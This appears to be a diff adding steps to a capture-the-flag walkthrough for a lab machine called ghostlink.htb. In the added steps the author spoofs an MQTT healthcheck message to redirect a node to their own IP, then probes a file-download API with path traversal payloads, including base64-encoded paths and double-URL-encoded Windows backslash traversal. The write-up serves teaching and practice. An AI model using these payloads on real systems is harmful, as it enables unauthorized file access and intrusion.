@@ -186,3 +186,72 @@ func main() {
 
 **We found that this version v0.13.3 is vulnearble to a RCE but we need a creds so lets do it after we found or catch any creds.**
 
+<mark style="color:blue;">**Step 6**</mark>
+
+**I tried many tools for mqtt clients but tbh i read the writeup i found that i did everything correct but the problem is in the tool so i use the one they used and it work**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+mqttui -b mqtt://ghostlink.htb publish  -r "GhostProtocolZero/systems/node/secureshare/healthcheck" '{"timestamp":"2026-03-03-09:26:21","node":"node-6","telemetry":
+{"healthy":true,"url":"http://10.10.14.92","lastCheckSecAgo":45,"responseCode":"200","ip":"
+172.16.20.10"}}'
+
+python3 /opt/ghostsurf/ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb -r -k
+# and i add a 1080 proxy on foxy proxy then it open 
+```
+{% endcode %}
+
+**The way we used this because we have 6 nodes one is for repos and the ther you may need creds it still this secure file sharing that give us an idea that we need to abuse it**
+
+{% hint style="info" %}
+**every time i see a web app and an AD i tried to relay**&#x20;
+{% endhint %}
+
+<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+**To use burp we need to configure an upstrem proxy rule  (Proxy Settings -> Network -> Connections)**&#x20;
+
+<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:blue;">**Step 7**</mark>
+
+**Now let's discover the app it's a secure file upload or transfer it encrypt a file and gice you the link for it using a REST api so the main idea is to trying an LFI**
+
+{% code overflow="wrap" %}
+```bash
+echo "/etc/passwd" | base64
+
+curl -x 127.0.0.1:8081 "http://gpz-op26-secure.ghostlink.htb/api/download/L2V0Yy9ob3N0bmFtZQ=="
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+**It give 500 internal error so we may be touching a server here le'ts try more options**&#x20;
+
+{% code overflow="wrap" %}
+```
+GET /api/download/../../../../../../etc/passwd HTTP/1.1
+Host: gpz-op26-secure.ghostlink.htb
+User-Agent: curl/8.19.0
+Accept: */*
+Connection: keep-alive
+
+
+HTTP Error 403. The request URL is forbidden
+```
+{% endcode %}
+
+**I think i make a payload work by double encoding him it give me 404 because we are on a windows app so the path we search does not exist**
+
+{% code overflow="wrap" %}
+```
+/api/download/..\..\..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts  
+i double encoded this it become like this and it work
+
+/api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
